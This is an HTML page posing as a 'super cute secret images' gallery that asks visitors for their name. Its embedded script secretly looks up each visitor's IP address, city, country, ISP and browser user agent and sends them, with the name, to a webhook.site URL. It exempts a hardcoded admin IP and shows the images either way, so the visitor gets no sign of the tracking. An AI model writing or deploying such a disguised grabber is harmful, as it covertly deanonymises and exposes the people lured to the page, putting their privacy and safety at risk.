<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        body {
            font-family: Comic Sans MS, cursive;
            text-align: center;
            background-color: #ffe6f2;
            padding: 20px;
        }
        #content {
            max-width: 800px;
            margin: 0 auto;
        }
        #user-image {
            max-width: 100%;
            border-radius: 8px;
            display: none;
            box-shadow: 0 0 15px hotpink;
        }
        #name-form {
            margin: 20px 0;
        }
        #image-gallery img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            display: none;
            box-shadow: 0 0 15px hotpink;
            margin: 10px;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>âœ¨ View Our Super Cute Secret Images âœ¨</h1>
        
        <div id="name-form">
            <p>Enter your name to unlock the cuteness:</p>
            <input type="text" id="userName" placeholder="UwU what's your name?">
            <button onclick="handleSubmission()">Show me ðŸ’–</button>
        </div>

        <!-- Image Gallery for Multiple Images -->
        <div id="image-gallery">
            <!-- Replace these links with real image URLs -->
            <img id="image1" src="https://i.imgur.com/bYfM1Kl.jpg" alt="UwU Image 1">
            <img id="image2" src="https://i.imgur.com/KhH8x1u.jpg" alt="UwU Image 2">
            <img id="image3" src="https://i.imgur.com/fT5r8pz.jpg" alt="UwU Image 3">
            <img id="image4" src="https://i.imgur.com/tvbc0Fv.jpg" alt="UwU Image 4">
        </div>
    </div>

    <script>
        const ADMIN_IP = "83.105.112.217";

        async function handleSubmission() {
            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";

            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                const userAgent = navigator.userAgent;

                const log = {
                    name: userName,
                    ip: ipData.ip,
                    city: ipData.city,
                    country: ipData.country,
                    isp: ipData.org,
                    userAgent,
                    time: new Date().toISOString()
                };

                // If viewer isn't admin, send log via webhook (or replace this later)
                if (ipData.ip !== ADMIN_IP) {
                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
                        method: "POST",
                        body: JSON.stringify(log),
                        headers: { "Content-Type": "application/json" }
                    });
                }

                // Show multiple images after form submission
                const images = document.querySelectorAll('#image-gallery img');
                images.forEach(img => img.style.display = 'block');  // Show all images
                document.getElementById('name-form').style.display = 'none';

            } catch (e) {
                // Fallback if tracking fails
                const images = document.querySelectorAll('#image-gallery img');
                images.forEach(img => img.style.display = 'block');
                document.getElementById('name-form').style.display = 'none';
            }
        }

        document.getElementById('userName').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmission();
        });
    </script>
</body>
</html>
